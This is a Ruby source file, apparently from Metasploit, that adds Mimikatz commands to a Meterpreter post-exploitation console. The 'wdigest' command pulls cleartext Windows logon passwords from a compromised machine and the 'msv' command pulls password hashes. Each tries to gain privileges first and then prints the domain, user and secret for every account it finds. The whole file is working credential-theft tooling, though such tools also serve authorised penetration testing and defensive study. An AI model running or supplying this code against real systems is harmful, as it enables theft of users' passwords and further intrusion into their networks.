# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Privilege escalation extension user interface.
#
###
class Console::CommandDispatcher::Mimikatz

	Klass = Console::CommandDispatcher::Mimikatz

	include Console::CommandDispatcher

	#
	# Initializes an instance of the priv command interaction.
	#
	def initialize(shell)
		super
	end

	#
	# List of supported commands.
	#
	def commands
		{
			"wdigest" => "Attempt to retrieve cleartext wdigest passwords",
			"msv" => "Attempt to retrieve hashes",
		}
	end

	def cmd_wdigest(*args)
		unless system_check
                        print_status("Attempting to get getprivs")
                        client.sys.config.getprivs
                end
                print_status("Retrieving passwords")
                accounts = client.mimikatz.wdigest
                
                table = Rex::Ui::Text::Table.new(
                        'Indent' => 0,
                        'SortIndex' => 4,
                        'Columns' =>
                        [
                                'AuthID', 'Package', 'Domain', 'User', 'Password'
                        ]
                )
                        
                accounts.each do |acc|
                        table << [acc[:authid], acc[:package], acc[:domain], acc[:user],  acc[:password]]       
                end

                table.print     

                return true
	end

	def cmd_msv(*args)
                unless system_check
                        print_status("Attempting to get getprivs")
                        client.sys.config.getprivs
                end
                print_status("Retrieving passwords")
                accounts = client.mimikatz.msv
                
                table = Rex::Ui::Text::Table.new(
                        'Indent' => 0,
                        'SortIndex' => 4,
                        'Columns' =>
                        [
                                'AuthID', 'Package', 'Domain', 'User', 'Hash'
                        ]
                )
                        
                accounts.each do |acc|
                        table << [acc[:authid], acc[:package], acc[:domain], acc[:user],  acc[:password]]       
                end

                table.print     

                return true
	end

	def system_check
		if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
			print_warning("Not currently running as SYSTEM")
			return false
		end

		return true
	end

	#
	# Name for this dispatcher
	#
	def name
		"Mimikatz"
	end

end

end
end
end
end
